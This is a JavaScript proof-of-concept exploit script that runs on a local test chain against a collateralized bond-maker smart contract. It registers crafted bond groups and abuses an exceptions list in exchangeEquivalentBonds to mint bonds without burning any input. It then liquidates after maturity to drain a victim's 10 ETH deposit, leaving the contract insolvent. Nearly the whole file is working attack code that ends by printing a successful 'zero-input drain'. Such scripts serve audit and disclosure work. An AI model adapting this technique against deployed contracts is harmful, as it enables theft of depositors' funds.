/* PoC2 (zero-input variant of same bug):
 * G_in=[B,B,T] with fB=0.49x, fT=0.02x. G_out=[R,B,T,C] with fR=0.25x, fC=0.24x.
 * exchangeEquivalentBonds(G_in,G_out,A,exceptions=[B,T,C]):
 *  input matches: B x2 + T x1 + C x0 = 3 == |exceptions|  -> all input bonds "excepted", NOTHING burned
 *  output decrements: B,T,C once each -> 0               -> R minted in arbitrary amount A
 * Attacker never deposits and holds no bonds before the call.
 */
const { ethers } = require('ethers');
const ganache = require('ganache');
const artifacts = require('./artifacts.json');
const BN = ethers.BigNumber;
const fmt = (x) => ethers.utils.formatEther(x);
const gasTrack = {};
async function send(txPromise, tag, idx) {
  const tx = await txPromise; const r = await tx.wait();
  if (idx !== undefined) gasTrack[idx] = (gasTrack[idx] || BN.from(0)).add(r.gasUsed.mul(tx.gasPrice || BN.from(0)));
  console.log(`  [tx] ${tag} gas=${r.gasUsed.toString()} status=${r.status}`);
  return r;
}
function fnMap(points) {
  let prev = [0, 0]; const segs = [];
  for (const p of points) { segs.push(BN.from(prev[0]).shl(192).or(BN.from(prev[1]).shl(128)).or(BN.from(p[0]).shl(64)).or(BN.from(p[1])).toString()); prev = p; }
  return ethers.utils.defaultAbiCoder.encode(['uint256[]'], [segs]);
}
async function main() {
  const gp = ganache.provider({ logging: { quiet: true }, chain: { allowUnlimitedContractSize: true }, miner: { blockGasLimit: 100_000_000, defaultGasPrice: 1_000_000_000 }, wallet: { totalAccounts: 6, defaultBalance: 1000 } });
  const provider = new ethers.providers.Web3Provider(gp);
  const [deployer, victim, attacker, feeTaker] = [provider.getSigner(0), provider.getSigner(1), provider.getSigner(2), provider.getSigner(3)];
  const Aaddr = { victim: await victim.getAddress(), attacker: await attacker.getAddress(), feeTaker: await feeTaker.getAddress() };
  const deploy = async (s, n, a = []) => { const f = new ethers.ContractFactory(artifacts[n].abi, artifacts[n].bytecode, s); const c = await f.deploy(...a); await c.deployTransaction.wait(); console.log(`  deployed ${n} @ ${c.address}`); return c; };
  const at = (n, a, s) => new ethers.Contract(a, artifacts[n].abi, s);

  const oracle = await deploy(deployer, 'TestOracle', [400, 0]);
  const namer = await deploy(deployer, 'BondTokenName', []);
  const factory = await deploy(deployer, 'BondTokenFactory', []);
  const maker = await deploy(deployer, 'BondMakerCollateralizedEth', [oracle.address, Aaddr.feeTaker, namer.address, factory.address, 3600]);
  const now = (await provider.getBlock('latest')).timestamp;
  const maturity = (Math.floor(now / 3600) + 2) * 3600;
  const mAtk = at('BondMakerCollateralizedEth', maker.address, attacker);
  const mVic = at('BondMakerCollateralizedEth', maker.address, victim);

  async function regBond(points, label, s = attacker) {
    const m = at('BondMakerCollateralizedEth', maker.address, s);
    const fm = fnMap(points); const id = await m.generateBondID(maturity, fm);
    await send(m.registerNewBond(maturity, fm, { gasLimit: 20_000_000 }), 'register ' + label);
    const info = await m.getBond(id); return { id, token: info[0] };
  }
  // single-segment proportional payoffs
  const B = await regBond([[100, 49]], 'B f=0.49x');
  const T = await regBond([[100, 2]], 'T f=0.02x');
  const C = await regBond([[100, 24]], 'C f=0.24x');
  const R = await regBond([[100, 25]], 'R f=0.25x (FREE MINT target)');
  const SBT = await regBond([[200, 200], [201, 200]], 'victim SBT', victim);
  const LBT = await regBond([[200, 0], [201, 1]], 'victim LBT', victim);

  async function regGroup(ids, label, s = attacker) {
    const m = at('BondMakerCollateralizedEth', maker.address, s);
    const gid = await m.callStatic.registerNewBondGroup(ids, maturity);
    await send(m.registerNewBondGroup(ids, maturity, { gasLimit: 20_000_000 }), 'group ' + label);
    return gid.toString();
  }
  const G_IN = await regGroup([B.id, B.id, T.id], 'G_in=[B,B,T]');
  const G_OUT = await regGroup([R.id, B.id, T.id, C.id], 'G_out=[R,B,T,C]');
  const G_VIC = await regGroup([SBT.id, LBT.id], 'G_vic', victim);

  await send(mVic.issueNewBonds(G_VIC, { value: ethers.utils.parseEther('10'), gasLimit: 20_000_000 }), 'victim issue 10 ETH', 1);
  const atkBefore = await provider.getBalance(Aaddr.attacker);
  const gasBefore = gasTrack[2] || BN.from(0);
  console.log('\nAttacker bond holdings before exploit (expect all 0):',
    'B=', (await at('BondTokenCollateralizedEth', B.token, attacker).balanceOf(Aaddr.attacker)).toString(),
    'T=', (await at('BondTokenCollateralizedEth', T.token, attacker).balanceOf(Aaddr.attacker)).toString(),
    'R=', (await at('BondTokenCollateralizedEth', R.token, attacker).balanceOf(Aaddr.attacker)).toString());

  // entitlement target 9.9 ETH: payment = A * 1e10 wei * 0.25  => A = 9.9e18 / 2.5e9 = 3,960,000,000
  const A = BN.from('3960000000');
  console.log('\n>>> exchangeEquivalentBonds(G_in, G_out, 3,960,000,000, [B,T,C]) with ZERO holdings / ZERO deposit');
  await send(mAtk.exchangeEquivalentBonds(G_IN, G_OUT, A, [B.id, T.id, C.id], { gasLimit: 20_000_000 }), 'ZERO-INPUT EXPLOIT', 2);
  console.log('  Attacker R balance now:', (await at('BondTokenCollateralizedEth', R.token, attacker).balanceOf(Aaddr.attacker)).toString());

  await provider.send('evm_increaseTime', [maturity - now + 100]); await provider.send('evm_mine', []);
  await send(at('TestOracle', oracle.address, deployer).testSetOracleData(400, 0), 'oracle print post-maturity');
  await send(mAtk.liquidateBond(G_OUT, 0, { gasLimit: 20_000_000 }), 'liquidate G_out (R paid first)', 2);
  await send(at('BondTokenCollateralizedEth', R.token, attacker).burnAll({ gasLimit: 20_000_000 }), 'attacker burnAll R', 2);

  const atkAfter = await provider.getBalance(Aaddr.attacker);
  const net = atkAfter.sub(atkBefore).add((gasTrack[2] || BN.from(0)).sub(gasBefore));
  console.log('\n================ RESULT ================');
  console.log('Attacker deposited: 0 ETH | Attacker net PnL (gas added back):', fmt(net), 'ETH');
  console.log('BondMaker balance left:', fmt(await provider.getBalance(maker.address)), 'ETH (victim deposited 10)');
  try {
    await send(mVic.liquidateBond(G_VIC, 0, { gasLimit: 20_000_000 }), 'victim liquidate', 1);
    console.log('victim liquidation unexpectedly succeeded');
  } catch (e) { console.log('Victim liquidateBond REVERTED (insolvent BondMaker).'); }
  if (net.lte(0)) { console.error('FAIL'); process.exit(2); }
  console.log('SUCCESS: zero-input drain of', fmt(net), 'ETH');
  process.exit(0);
}
main().catch((e) => { console.error(e); process.exit(1); });
